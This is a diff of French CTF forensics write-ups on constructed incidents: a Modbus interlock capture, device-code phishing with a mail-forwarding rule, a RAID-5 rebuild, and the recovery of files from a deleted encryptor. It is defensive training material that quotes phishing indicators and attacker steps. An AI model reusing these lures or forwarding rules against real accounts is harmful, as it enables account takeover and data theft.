-tshark -r interlock.pcapng -q -z conv,tcp
-# 127.0.0.1:59818 <-> 127.0.0.1:502 uniquement
-```
-
-Les trois fichiers Markdown forment toute la spécification — aucun indice caché ailleurs :
-
-- `register-map.md` : adresses **PDU** base zéro. `40011/40012/40013/40020/40021` ne sont que des étiquettes opérateur. Mots mappés : `0x000A` `maintenance_permit`, `0x000B` `isolation_state`, `0x000C` `protection_armed`, `0x0013` `trip_limit`, `0x0014` `restore_delay`.
-- `interlock-policy.md` : la règle hors ligne d'acceptation + de sécurité (ci-dessous).
-- `witness-format.md` : la sérialisation et le hash, plus un vecteur de vérification hors incident.
-
-Le framing des payloads TCP par la longueur MBAP donne **504 ADU Modbus = 252 transactions** (TID 1–252, strictement séquentiels, aucune retransmission, aucun ADU scindé/fusionné) : 124 paires FC03 et 128 paires FC16, toutes en protocole `0x0000` et unité `0x01`. Chaque réponse FC03 porte un byte count `22 = 2 × 11`, et chaque réponse normale FC16 répète adresse de départ + quantité — les filtres d'acceptation ci-dessous rejettent donc **0** transaction dans cette capture. Il fallait le vérifier, pas le supposer : c'est ce qui rend les 128 FC16 « acceptés ».
-
-**2. Hypothèse — une machine à états hors ligne, pas une chasse aux chaînes**
-
-Le flag est un SHA-256 : impossible à carver depuis la capture. Il faut le recalculer en rejouant, dans l'ordre des réponses normales :
-
-1. **FC03 accepté** seulement si la requête FC03 immédiatement précédente correspond en TID/proto/unité/fonction dans le flux renversé et `byte_count == 2 × quantity`. Il met alors à jour chaque mot mappé qu'il couvre. Ici chaque FC03 lit `0x000A` quantité 11, soit `0x000A…0x0014` : chaque observation acceptée rafraîchit donc les cinq mots mappés d'un coup.
-2. **FC16 accepté** seulement si sa réponse normale correspond en TID/proto/unité/fonction et répète adresse de départ + quantité. Les exceptions ne changent jamais l'état. Une écriture acceptée s'applique **après** sa réponse normale.
-3. **Cible** = FC16 accepté de quantité 1 en `0x0013` ou `0x0014`. La politique annonce 8 autres FC16 acceptés inéligibles ; la capture contient bien exactement 5 écritures de prérequis (`0x000C=1` TID 2, `0x000A=1` TID 19, `0x000B=1` TID 20, `0x000B=0` TID 125, `0x000B=1` TID 142) et 3 écritures d'acquittement (`0x0018/0x0019/0x001A`, TID 248/250/252), soit 120 cibles (60 par adresse).
-4. **Unsafe** = au moins l'une des conditions `permit==1`, `isolation==1`, `protection==1` est fausse **immédiatement avant la réponse normale de la cible** (une écriture ne se juge donc jamais elle-même, et une écriture de prérequis ne compte qu'à partir de la transaction suivante).
-
-Deux pièges en découlent directement : utiliser les références affichées `400xx` au lieu des adresses PDU ne trouve rien, et juger la sécurité depuis la valeur écrite par la cible — ou après l'application de sa réponse — fausse les transactions frontières.
-
-Chronologie d'état issue du rejeu (le triplet de prérequis ne change qu'à ces points) :
-
-| Après TID | permit | isolation | protection | Cause |
-|---|---|---|---|---|
-| 1 (FC03) | 0 | 0 | 1 | observation initiale |
-| 21 (FC03) | 1 | 1 | 1 | TID 19+20 arment permit/isolation |
-| 126 (FC03) | 1 | 0 | 1 | TID 125 a relâché l'isolation |
-| 143 (FC03) | 1 | 1 | 1 | TID 142 a restauré l'isolation |
-
-**3. Exploitation — sélectionner les cibles unsafe et hacher le témoin**
-
-L'application de la règle donne **16 cibles unsafe** sur 120 : TID **4, 6, 8, 10, 12, 14, 16, 18** (interlock pas encore établi, `0,0,1`) et TID **127, 129, 131, 133, 135, 137, 139, 141** (isolation relâchée, `1,0,1`). Les 104 autres cibles voient `1,1,1` et sont sûres.
-
-Pour chaque cible unsafe, dans l'ordre des réponses normales, concaténer le PDU requête (`function-code || function-data`, **sans MBAP**) puis le PDU réponse normale : `T` fait `16 × (8 + 5) = 208` octets. Avec `P = "INTERLOCK-WITNESS/1" || 0x00` (20 octets), `W = SHA-256(P || T)`.
-
-Le solveur n'utilise que la stdlib (son propre framing pcapng/Ethernet/IPv4/TCP/Modbus) et vérifie d'abord le vecteur publié — requête `10 00 13 00 01 02 00 2a` + réponse `10 00 13 00 01` → `b6e58fa9…f34786` — avant de toucher à la capture de l'incident :
-
-```bash
-python3 solve/solve.py ../interlock-witness.zip
-# [*] Vector OK    : b6e58fa962e382b112eb596e416d5680495fc4bd02141f2389797f194df34786
-# [*] Modbus ADUs  : 504
-# [*] FC03 accepted: 124 (rejected 0)
-# [*] FC16 accepted: 128 (rejected 0), targets 120
-# [*] Unsafe targets: 16 (normal-response order)
-#     TID   4 permit=0 isolation=0 protection=1 req=100013000102040d resp=1000130001
-#     ...
-#     TID 141 permit=1 isolation=0 protection=1 req=1000140001020a9a resp=1000140001
-# [*] T (208 bytes): 100013000102040d1000130001...
-# [+] FLAG         : CSCTF{...}
-```
-
-Script de résolution : `solve/solve.py` (voir l'annexe)
-
-#### Flag
-
-`flag{...}` (masqué)
-
-#### Ce que j'ai appris
-
-- Lire les trois fichiers de spec comme un seul contrat avant d'ouvrir Wireshark : acceptation, éligibilité cible, instant de sécurité et sérialisation sont quatre filtres distincts, et chacun change le hash.
-- « Immédiatement avant sa réponse normale » + « s'applique après sa réponse normale » constituent tout le modèle temporel. Évaluer à la requête coïncide ici uniquement parce que requêtes et réponses sont strictement séquentielles — le rejeu en ordre de réponse est l'implémentation sûre.
-- Une capture synthétique propre exige quand même les contrôles de rejet : vérifier 124/124 FC03 et 128/128 FC16 acceptés (et la continuité des séquences TCP, sans retransmission) justifie de traiter chaque cible FC16 comme dans le périmètre.
-- Les étiquettes `400xx` sont le piège d'adressage délibéré : tout le filtrage doit utiliser les adresses PDU base zéro (`0x000A…0x0014`).
-
-#### Outils et références
-
-- Python 3 stdlib (`struct`, `hashlib`, `zipfile`) — le solveur n'exige aucun package tiers
-- Wireshark / `tshark`, `capinfos` (contre-vérifications de reconnaissance seulement)
-- Layouts MBAP Modbus/TCP + PDU FC03/FC16 (0x10) ; format de blocs pcapng
+- `journalctl --file=… -o json`, `strings`, Python 3 (`tarfile`, `hmac`, `hashlib`)
+- xattrs Linux / file capabilities (`security.capability`), en-têtes PAX `SCHILY.xattr.*`, champs personnalisés du journal systemd
 
 
 ### CAPTCHA THE WATER PLANT
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| forensics | 168 | 32 | ✅ | — | 0xAr3s-root | Marius Merai |
+| forensics | 32 | ✅ | — | oui | 0xAr3s-root | Marius Merai |
 
 #### Énoncé
 
@@ -1446,187 +874,186 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 - MITRE ATT&CK : T1059.001 (PowerShell), T1219 (RMM), T1053.005 (tâche planifiée), T1555 (credentials dans fichiers — tenté)
 
 
-### Operation Dawn: Relay Snapshot
+### Code Red Freight
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| forensics | 125 | 42 | ✅ | — | 0xAr3s-root | Terminal43 |
+| forensics | 102 | ✅ | — | non | 0xAr3s-root | Marius Merai |
 
 #### Énoncé
 
-> Une intrusion hostile a mis hors service le relais militaire d'un pays fictif, et les
-> intervenants ont capturé la mémoire du processus du relais pendant qu'ils récupéraient
-> un ordre de commandement.
+> Tarnovel Rail Freight's defence-consignment manifests are reaching an outside mailbox. The dispatcher noticed nothing. You have her identity, mailbox-audit exports, and the email she clicked. Identify the device the adversary controls, the rule leaking manifests, and the number of files they downloaded.
 >
-> Récupérez l'ordre complet `CSCTF{...}` depuis `relay.core`. Ce cas construit contient
-> des enregistrements de relais inventés dans un vrai snapshot de processus Linux.
-> Pièce jointe : `relay.core`, core ELF Linux x86-64, 586 928 octets,
-> SHA-256 `b3e606bfbe727f0346be4cde683a9a8efd2680930219113a5b779a3c9a5121ac`.
+> This is a constructed incident-analysis case built from sanitized Microsoft Entra and Purview-style exports. Work only with the supplied evidence; do not contact domains, addresses, or services named in it.
+>
+> Attachment: `code_red_freight.zip`
+>
+> Flag format: `CSCTF{device_rule_count}` (ex. `CSCTF{DESKTOP-XXXX_ForwardRule_42}` — illustratif uniquement)
 
-**Fichiers fournis :** `files/relay.core` (non commité)
+**Fichiers fournis :** `files/code_red_freight.zip` (non commité — actuellement dans `forensics/code_red_freight.zip`)
 
 #### En bref
 
-Le tas du processus contient une liste chaînée simple de nœuds-fragments de chaînes ;
-la chaîne enracinée au nœud `CSCTF` reconstitue le flag. Des chaînes leurres ont été
-injectées pour perturber l'analyse.
+Phishing device-code (`microsoft.com/devicelogin` + leurre de partage lookalike) ayant donné à l'attaquant une session Entra depuis Montréal ; le dispositif Azure AD pirate, la règle de boîte vers l'externe et les événements SharePoint `FileDownloaded` pointent tous vers le même IP/dispositif — les trois parties du flag sont dérivées à l'étape 3 (`flag{...}` masqué).
 
 #### Démarche
 
-**1. Reconnaissance initiale**
+**1. Reconnaissance — inventorier et séparer les deux mondes**
 
 ```bash
-file relay.core    # ELF 64-bit core, x86-64
-strings relay.core | grep CSCTF
+unzip -l code_red_freight.zip
+# logs/AuditLogs_2026-10-29-Patti_Fernandez.csv          (12 lignes)
+# logs/InteractiveSignIns_2026-10-28_2026-10-29.csv      (18 lignes)
+# logs/NonInteractiveSignIns_2026-10-28_2026-10-29.csv   (256 lignes)
+# logs/UnifiedAuditLog_Patti.csv                         (188 lignes)
+# lure/email_phish.png  lure/devicecode_phish.png
 ```
 
-`strings` révèle les fragments dispersés en mémoire, dans le mauvais ordre. Ils sont des
-objets du tas qui doivent être parcourus via des pointeurs.
+Les leurres racontent l'histoire avant tout log : un email de `ragubarden@proton.me` (« Jordan Smith shared Draft_Budget_v2.docx ») pointe vers `https://Sharepoint.cz/584c39f3-…`, et la fausse page OneDrive demande `microsoft.com/devicelogin` + code `CXR7QK2WD` — phishing device-code classique. Deux IP séparent ensuite proprement tous les logs : la dispatcher Patti sur `198.51.100.24` (Bucuresti/Timisoara) contre l'attaquant sur `203.0.113.77` (Montréal).
 
-**2. Compréhension de la structure de données**
+Le `Register device` d'AuditLogs concrétise la séparation — une ligne par monde :
 
-En parsant les segments PT_LOAD du fichier ELF et en cherchant les objets commençant par
-`uint64 = 0x31` :
+| Date | Dispositif | IP | DeviceId |
+|---|---|---|---|
+| 2026-10-28 07:12 | `R3M0TE-W0RK-PC` (référence) | 198.51.100.24 | `3f8c1a7b-…` |
+| 2026-10-29 15:05 | `D3VC0DE-R3L4Y` (pirate) | 203.0.113.77 | `95caec44-…` |
 
-```
-struct Container {
-    uint64_t type;   // toujours 0x31
-    struct Node {
-        struct Node *next;   // VA du nœud suivant, 0 = fin de liste
-        uint32_t     len;
-        char         data[]; // rembourré de zéros
-    } node;
-};
-```
+Les connexions interactives confirment le mécanisme : l'enregistrement pirate suit une paire `deviceCodeFlow` / `Authentication Protocol: deviceCode` sur `Microsoft Authentication Broker → Device Registration Service` depuis l'IP attaquante (échec 50199 « user interaction required » à 15:04:52, succès à 15:04:55), après quoi chaque session attaquante est liée `deviceCodeFlow`, `Azure AD joined`, avec le DeviceId `95caec44-…` (40 lignes non interactives ; le monde bénin a un DeviceId vide partout).
 
-Le membre `node` commence 8 octets après le début du container :
-`node_va = container_va + 8`. Le champ `next` est la VA du **prochain nœud**
-(= `next_container_va + 8`).
+**2. Hypothèse — un dispositif, une règle, ne compter que ses téléchargements**
 
-23 containers sont trouvés, chacun portant un fragment de chaîne.
+Avec le DeviceId attaquant fixé (`95caec44-c8af-4786-976c-73bd33d9d143`), l'Unified Audit Log est sans ambiguïté :
 
-**3. Reconstruction des chaînes**
+- `New-InboxRule` apparaît exactement deux fois. La règle bénigne `Newsletters` (2026-10-28, IP/session de la dispatcher, `MoveToFolder` + `FromAddressContainsWords`, sans DeviceId) est la référence ; la règle `M4N1F3ST-L3AK` du 2026-10-29T15:28:57 vient de `203.0.113.77:17091` sur la session attaquante `009d0b3a-…`, porte le DeviceId attaquant, pose `ForwardTo = ragubarden@proton.me` (l'expéditeur du leurre) avec `StopProcessingRules = True`. Nom, destination et dispositif convergent.
+- `FileDownloaded` apparaît exactement 4 fois — tous depuis `203.0.113.77`, tous en UA `Microsoft Teams`, aucun depuis l'IP de la dispatcher : `Investor Relations Meeting Presentation.pptx`, `aerialshot.jpg`, `Local Resource Guide.docx`, `Notes.docx` (15:20:24–15:21:36). Les lignes `FileAccessed`/`FileModified` d'autres IP (plages service/MFA) sont des lectures et du bruit de synchro, pas des téléchargements, et les lignes `MailItemsAccessed` ne portent aucun signal IP attaquant — le compte est donc 4, pas 30.
 
-On construit un graphe `node_va → (next_va, chaîne)`, puis on trouve les têtes de chaînes
-(nœuds vers lesquels aucun autre nœud ne pointe) → 10 chaînes. L'une d'elles commence
-au nœud `CSCTF` :
-
-```
-CSCTF → {20_ → dock → _mov → e_orc → hard_ → elm_ → grove → _dus → k_866 → 59c}
-```
-
-Les autres chaînes sont des leurres (trafic forgé dans le scénario).
+**3. Exploitation — dériver, pas coder en dur**
 
 ```bash
-python3 solve/solve.py files/relay.core
+python3 solve/solve.py ../code_red_freight.zip
+# [*] Device registrations:
+#     2026-10-29T15:05:03 ... D3VC0DE-R3L4Y ip=203.0.113.77 deviceId=95caec44-…
+#     2026-10-28T07:12:03 ... R3M0TE-W0RK-PC ip=198.51.100.24 deviceId=3f8c1a7b-…
+# [*] Inbox rules:
+#     2026-10-29T15:28:57 name=M4N1F3ST-L3AK ip=203.0.113.77:17091 device=95caec44-… forward=ragubarden@proton.me
+#     2026-10-28T07:34:27 name=Newsletters ip=198.51.100.24:51224 forward=None move=Newsletters
+# [*] FileDownloaded events: (4, tous 203.0.113.77)
+# [+] FLAG            : CSCTF{...}
 ```
 
-```
-[+] FLAG chain at 0x55a7aff173c0: flag{...}
-```
+Le solveur vérifie chaque lien (DeviceId de la règle == dispositif pirate, tous les téléchargements depuis l'IP attaquante, référence bénigne présente) au lieu de faire confiance aux noms : une variante aux noms changés se résoudrait quand même — ou échouerait bruyamment plutôt que d'émettre un faux flag.
 
 Script de résolution : `solve/solve.py` (voir l'annexe)
 
 #### Flag
 
-`flag{...}`
+`flag{...}` (masqué)
 
 #### Ce que j'ai appris
 
-- `strings` révèle immédiatement les fragments, mais dans l'ordre de traversée du tas,
-  pas dans l'ordre logique.
-- Insight clé : les chaînes sont stockées dans une **liste chaînée simple**, pas
-  contiguëment.
-- Le challenge plante plusieurs chaînes leurres ; la bonne démarre au nœud `CSCTF`.
-- Un parsing ELF en Python pur (sans pwntools, sans gdb) est suffisant.
+- Les noms leet (`D3VC0DE-R3L4Y` = device-relay, `M4N1F3ST-L3AK` = manifest-leak) confirment la réponse mais ne doivent pas *être* la méthode : la liaison par DeviceId (enregistrement → sessions → règle) et la séparation par IP sont la vraie preuve, et elles survivraient à des leurres renommés.
+- `FileDownloaded` ≠ `FileAccessed` : compter chaque toucher SharePoint gonfle le nombre. Seule l'opération `FileDownloaded` avec l'IP attaquante compte — le solveur impose que les 4 viennent d'une seule IP.
+- La règle bénigne `Newsletters` est le contrôle fourni par le challenge : même opération, IP/session/dispositif/paramètres différents. La vérifier d'abord fait ressortir la règle malveillante au lieu d'être « la première règle trouvée ».
 
 #### Outils et références
 
-- `file`, `strings` (binutils)
-- Python 3 (`struct`)
-- Spécification ELF (System V ABI, supplément x86-64)
+- Python 3 stdlib (`csv`, `json`, `zipfile`) — aucune dépendance
+- Visionneuse d'images (PNG leurres — lecture seule, jamais ouvrir les liens)
+- Sémantique Entra / UAL Purview : flux deviceCode, `Register device`, `New-InboxRule` (`ForwardTo`), `FileDownloaded`
 
 
-### Capability Ghost
+### Dawn Array
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| forensics | 120 | 106 | ✅ | — | 0xAr3s-root | Mohamed Amine Mzoughi |
+| forensics | 99 | ✅ | — | non | 0xAr3s-root | Chronos Security |
 
 #### Énoncé
 
-> A hostile-state campaign targeted the build runner for the software that drives signals on railways carrying coalition freight toward the Operation Dawn front. Responders kept the runner's filesystem archive and journal.
+> During a state-sponsored attempt to isolate the eastern corridor, dispatch gateway E2 of the Rovenqara Rail Continuity Authority (RRCA) issued conflicting turnout-release records and was then powered off. RRCA runs the rail lines that carry coalition supply in the Operation Dawn theatre, and the corridor stays shut until responders know which releases the corridor controller actually acknowledged.
 >
-> Recover the sealed marker from them. Inspect the records as data: do not run the supplied programs or restore their capabilities. Linux tools or WSL are enough, and you do not need root. This is a constructed forensic exercise, not evidence of an actual compromise.
+> The gateway kept its staging volume on a four-member Linux md RAID-5 array; one member is lost and three raw members survive. Rebuild the volume read-only, then apply the gateway's own dispatch procedure, stored on that volume, to find the controller-acknowledged release witness, and report it in the form the procedure defines. This is a constructed recovery case built on real Linux md RAID-5, ext4, SQLite WAL, RFC 5424 and HTTP/1.1, not an acquisition from physical disks.
 >
-> Attachment: `capability-ghost.zip`, 51,023 bytes, SHA-256 `c53a83833466cc4db34336ab9e333a0e317cd48da43932953df89cacb9c31ffe`.
+> Attachment: `dawn-array.zip` (604,849 bytes, SHA-256 `e41e1a4c6b2b…05de66`)
 >
-> Submit the complete recovered `CSCTF{...}` value. Flag format: `CSCTF{...}`
+> Flag format: `CSCTF{dawn_<64 lowercase hex digits>}`
 
-**Fichiers fournis :** `files/runner-fs.tar.gz`, `files/runner.journal`, `files/README_FOR_RESPONDERS.md`, `files/manifest.sha256` (non commités).
+**Fichiers fournis :** `files/dawn-array.zip` (non commité — actuellement dans `forensics/dawn-array.zip`)
 
 #### En bref
 
-`/etc/solunet/signaling-cfg.sealed` est XORé avec une clé que `hc-probe` dérive en `HMAC-SHA256(tag, epoch)` : le tag est l'xattr `user.build_seal` conservé dans les en-têtes PAX du tar, l'epoch est le champ `X_SEAL_EPOCH` du journal ; recalculer la clé hors ligne déchiffre le marqueur → flag.
+Parser les superblocs md v1 pour la vraie géométrie (left-symmetric, chunks 32 Kio, data offset 1 Mio, rôles 0/2/3 présents), reconstruire le volume ext4 de 117 Mio en lecture seule, lire le ledger SQLite *avec son WAL appliqué*, et ne garder que les 16 cycles sur 128 dont réservation, readback et phases syslog concordent selon la procédure DP-7 — leur SHA-256 est le témoin.
 
 #### Démarche
 
-**1. Reconnaissance — un tar avec xattrs, un journal et une config détruite**
-
-`runner-fs.tar.gz` contient une petite arborescence : `/etc/solunet/signaling-cfg.sealed` (27 octets), `/usr/local/bin/hc-probe`, `backup-sync`, `ping`, une unité `hc-probe.service` et `/root/.bash_history`. L'historique raconte la scène : `setcap` sur `hc-probe`, un `TAG` aléatoire, `setfattr -n user.build_seal`, un `EPOCH=$(date +%s)`, puis `hc-probe --seal "$TAG" "$EPOCH" signaling-cfg signaling-cfg.sealed` et `shred -u` du clair. Le clair est donc perdu ; la seule voie est d'inverser le scellement avec le bon tag et la bonne epoch.
-
-Les xattrs ne sont pas appliqués à l'extraction (pas de root), mais ils sont stockés dans les en-têtes PAX étendus en `SCHILY.xattr.*`. Le `tarfile` de Python les expose dans `pax_headers` :
-
-```python
-import tarfile
-for m in tarfile.open("files/runner-fs.tar.gz"):
-    print(m.name, m.pax_headers)
-```
-
-`hc-probe` porte `security.capability` et `user.build_seal` = `50 9d f6 cd 8e 10 3f a5` (8 octets bruts ; `tarfile` l'affiche comme une chaîne UTF-8 avec échappements surrogate, donc je ré-encode en `surrogateescape` pour retrouver les octets). `backup-sync` a un `user.sync_id` et `ping` une capability, mais c'est du bruit.
-
-**2. Hypothèse — le binaire documente son propre schéma ; l'epoch est dans le journal**
-
-Je n'ai pas exécuté `hc-probe`. Un `strings` suffit : son aide indique que `--seal` et `--unseal` sont la même opération, un XOR à clé répétée avec `key = HMAC-SHA256(key = octets_bruts(tag_hex), msg = décimal_ascii(seal_epoch))`, `out[i] = in[i] XOR key[i mod 32]`. Il précise aussi d'où vient l'epoch : le champ `X_SEAL_EPOCH` de l'entrée de journal de ce run, **pas** l'horodatage de l'entrée elle-même.
+**1. Reconnaissance — inventaire, puis métadonnées avant les octets**
 
 ```bash
-journalctl --file=files/runner.journal --no-pager -o json
+unzip -l dawn-array.zip
+# CASE-SHEET.txt  acq-1.raw  acq-2.raw  acq-3.raw (40 Mio chacun)  tools/raid5_extract.py
 ```
 
-L'entrée 5 (`hc-probe`, « health probe sealed result written ») a `X_SEAL_EPOCH=1793294042`, alors que son `__REALTIME_TIMESTAMP` donne 1793294054 — 12 s plus tard : c'est le piège. Deux autres pièges sur le tag : le `TAG` de `.bash_history` n'est qu'une variable du shell d'origine (aléatoire, non enregistrée), et la commande shell stockait l'xattr sous forme de chaîne ASCII `0x…`, alors que l'archive contient les octets bruts ; c'est l'xattr de l'archive qui fait foi.
+Note : la copie locale hashe différemment du SHA-256 affiché sur la plateforme (suffixe `…ad5de66` contre `…a05de66`) ; l'analyse ci-dessous travaille strictement depuis les octets fournis, et chaque couche se revalide (UUID d'array commun, label/UUID ext4, correspondance 1:1 ledger/syslog, 128 échanges HTTP propres).
 
-**3. Exploitation — recalculer la clé hors ligne et XORer**
+Chaque membre porte un superbloc md v1.2 à l'offset fichier `0x1000` (magie `0xa92b4efc`, nom `rrca-gw-e2:staging`). Décodé selon `/usr/include/linux/raid/md_p.h` (`chunksize` en secteurs, rôles via `dev_roles[dev_number]`) :
+
+| Membre | dev_number | rôle | layout | chunk | data offset | taille utile |
+|---|---|---|---|---|---|---|
+| acq-1.raw | 0 | **0** | 2 = left-symmetric | 64 secteurs = 32 Kio | 2048 secteurs = 1 Mio | 79872 secteurs |
+| acq-2.raw | 4 | **3** | idem | idem | idem | idem |
+| acq-3.raw | 2 | **2** | idem | idem | idem | idem |
+
+Le membre perdu est donc le rôle 1 (parité recalculée), taille logique `3 × 79872 × 512 = 122 683 392` octets. Un premier balayage naïf (chasse à la magie ext4 sur permutations rôles/chunk/layout) a produit des centaines de hits car la redondance du stripe-0 duplique le superbloc sur deux membres — ce sont les rôles du superbloc qui tranchent, pas la magie.
+
+**2. Hypothèse — lire DP-7 avant de croire un seul enregistrement**
+
+Le volume (`rrca-staging`, UUID `e195b486-…`) contient exactement les trois types de preuves nommés par la procédure : `var/lib/rrca/dispatch.sqlite` (+ `-wal` de 552 Kio, `-shm`), `var/log/rrca/dispatch-gateway.syslog` (512 enregistrements RFC 5424, SD-ID `rrca@32473`) et `var/log/rrca/controller-access.pcapng` (2432 frames, 128 connexions loopback `10.61.4.10 → 10.61.4.21:8080`, chacune exactement POST/201 + GET/200).
+
+DP-7 (`usr/share/doc/rrca-dispatch-procedure.txt`) définit la qualification Q1–Q5 : une ligne ledger + une de chacune des quatre phases syslog partageant `(cycle_id, request_id, gateway_seq)` dans l'ordre ; headers/corps POST conformes à la ligne avec écho 201 ; révision/nonce de réponse conformes ledger *et* syslog ; GET nommant la même requête avec une vue readback conforme réponse et ledger ; readback syslog conforme ledger. Tout doublon, non-succès, corps manquant ou désordre disqualifie.
+
+Deux pièges en découlent directement : (a) 33 des 128 lignes ledger (`gateway_seq` 96–128) ne vivent **que dans le WAL** — une lecture du seul fichier principal les perd silencieusement, dont les cycles qualifiants 103/110/117 ; (b) les statuts seuls ne qualifient rien — les 128 échanges sont 201/200 sur le fil, et seuls 16 cycles survivent à la comparaison champ par champ.
+
+**3. Exploitation — reconstruire, puis filtrer**
 
 ```bash
-python3 -I solve/solve.py files
+python3 solve/solve.py ../dawn-array.zip
+# [*] md RAID-5: layout=left-symmetric chunk=32768 data_off=1048576
+#                array=122683392 roles=[0, 2, 3] missing=1
+# [*] Rebuilt 122683392 logical bytes, ext4 magic OK
+# [*] Ledger        : 128 rows (WAL applied)
+# [*] Syslog        : 512 records, 128 cycles
+# [*] Capture       : 128 connections, POST/201 + GET/200 each, no pipelining
+# [*] Qualifying    : 16 cycles
+# [*] Qualifying gateway_seq: 14,15,34,35,55,69,78,79,80,83,85,87,95,103,110,117
+# [+] FLAG            : CSCTF{...}
 ```
 
-Le script lit le tag dans les en-têtes PAX, l'epoch dans le journal (via `journalctl --file`), dérive la clé et XORe le fichier scellé. Un mauvais tag ou une mauvaise epoch donnerait des octets aléatoires ; ici la sortie commence par `CSCTF{` et est imprimable, ce qui confirme les deux valeurs.
+Le solveur dérive la géométrie des superblocs, délègue le brassage d'octets au `raid5_extract.py` fourni, extrait les fichiers en lecture seule via `debugfs` (ni montage, ni root), réassemble TCP/HTTP en Python pur, et vérifie chaque clause DP-7 — abandonnant plutôt que d'émettre un témoin si une attente structurelle casse. Les 112 rejets forment quatre classes nettes : nonce de réponse différant ledger+syslog (29), révision de réponse différant de `prepare_revision` (28), registres/valeurs du readback GET montrant la vue divergente du contrôleur (24, registres en `90xx`), et valeur du `READBACK_OBSERVED` syslog contredisant la ligne commise (31, toujours le bit `release_value`). Témoin = header 21 octets `RRCA-DAWN-WITNESS-v1\n` + 16 lignes `|` dans l'ordre croissant des `gateway_seq` (1733 octets), dont le SHA-256 est le corps du flag.
 
 Script de résolution : `solve/solve.py` (voir l'annexe)
 
 #### Flag
 
-`CSCTF{...}` (masqué)
+`flag{...}` (masqué)
 
-#### Réflexions
+#### Ce que j'ai appris
 
-- Les métadonnées d'archive (xattrs PAX) sont une preuve à part entière : un simple `tar -x` en non-root les perd silencieusement, il faut donc lire les en-têtes.
-- Quand un outil documente son propre schéma, lire les strings du binaire avant tout ; ici il signalait aussi le piège de l'epoch (champ du journal vs. heure de l'entrée).
-- Un déchiffrement correct se valide lui-même (sortie imprimable avec le préfixe `CSCTF{`), un bon contrôle quand plusieurs entrées candidates existent.
-- Rien n'a été exécuté, extrait en root ni restauré : toute la résolution est de l'analyse de données.
+- La chasse à la magie est un oracle faible sur array redondant : la parité du stripe-0 faisait apparaître le superbloc ext4 sous presque toutes les géométries. Les `dev_roles[]` md (ni les noms de fichiers, ni la magie) sont la vérité terrain pour l'ordre des membres.
+- Le WAL fait partie de la base : ouvrir le SQLite sans son `-wal` (ou n'extraire que `dispatch.sqlite` de l'image) perd les cycles 96–128 et donne un témoin de 13 lignes au hash faux. Copier le trio, ouvrir normalement, compter 128.
+- Le « HTTP status alone does not qualify » de DP-7 est littéral ici — les 128 échanges sont 201/200 sur le fil. La discrimination tient entièrement à l'accord nonce/révision/registre/valeur entre quatre sources (ledger, syslog, réponse de réservation, vue readback).
 
-#### Outils & références
+#### Outils et références
 
-- `journalctl --file=… -o json`, `strings`, Python 3 (`tarfile`, `hmac`, `hashlib`)
-- xattrs Linux / file capabilities (`security.capability`), en-têtes PAX `SCHILY.xattr.*`, champs personnalisés du journal systemd
+- Python 3 stdlib (`struct`, `hashlib`, `sqlite3`, `zipfile`) + `debugfs` (dumps lecture seule) + `tools/raid5_extract.py` fourni
+- `capinfos`/`tshark` (recon capture : 128 connexions × 19 frames)
+- Layout superbloc md v1 (`md_p.h`) ; algorithmes RAID-5 mdadm (2 = left-symmetric) ; magie superbloc ext4 `0x53EF` ; mode WAL SQLite ; structured data RFC 5424
 
 
 ### Flotsam
 
-| Catégorie | Points | Résolutions | Résolu | First blood | Résolu par | Auteur du challenge |
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
 |---|---|---|---|---|---|---|
-| forensics | 120 | 100 | ✅ | — | 0xAr3s-root | Chronos Security |
+| forensics | 100 | ✅ | — | non | 0xAr3s-root | Chronos Security |
 
 #### Énoncé
 
@@ -1693,11 +1120,198 @@ Script de résolution : `solve/solve.py` (voir l'annexe)
 - Structure des chunks PNG (IHDR/IDAT/IEND, CRC32), file carving de fichiers fragmentés
 
 
+### Ghost in the Historian
+
+| Catégorie | Résolutions | Résolu | First blood | Indice utilisé | Résolu par | Auteur du challenge |
+|---|---|---|---|---|---|---|
+| forensics | 107 | ✅ | — | non | 0xAr3s-root | Mohamed Amine Mzoughi |
+
+#### Énoncé
+
+> A campaign against the electricity supply encrypted a substation historian's configuration and deleted the encryptor. The substation feeds a partner nation's grid on the coalition side of Operation Dawn.
+>
+> Recover the original configuration's `SAFETY_INTERLOCK_TOKEN` and submit its complete `CSCTF{...}` value. The volume was constructed for this exercise and is not an untouched acquisition; the included brief explains its timeline. Analyze recovered programs as data: do not execute them or mount the image.
+>
+> Attachment: `ghost-in-the-historian.zip`, 72,560 bytes, SHA-256 `5edaea927aa93db3286f771dd77c8c41e0c23c6eafa70ac2182da5bd9ac56ce9`
+
+**Fichiers fournis :** `files/ghost-in-the-historian.zip` (non commité — actuellement dans `network/ghost-in-the-historian.zip`)
+
+#### En bref
+
+Carver le `historian_enc` ELF supprimé depuis l'espace non alloué, lire son désassemblage comme des données (flot xorshift32, graine `(time() ^ getpid()) × 0x9E3779B1`, PID issu de sa propre ligne syslog), brute-forcer les secondes autour du sweep de 04:13, puis déchiffrer en chaîne les trois configs `.enc` — le fichier topologie contient le token.
+
+#### Démarche
+
+**1. Reconnaissance — un petit monde ext4 avec trois fichiers verrouillés**
+
+Le ZIP se vérifie (`5edaea92…56ce9`) et contient un descripteur VMDK plus une extent flat de 64 Mio (`evidence-flat.vmdk`, 131072 secteurs, `manifest.sha256` couvre les trois fichiers). `debugfs` en lecture seule, jamais de montage :
+
+```bash
+debugfs -R "ls -l /" evidence-flat.vmdk
+# /var/historian → node_status.json.enc (74 o), grid_topology.cfg.enc (235 o),
+#                  historian_cache.dat.enc (64 o), tous datés 2-oct-2026 05:13
+# /var/log/historian.log → une ligne : 2026-10-02 04:13 historian_enc[2764964] :
+#                          starting encryption sweep, target_dir=/var/historian
+```
+
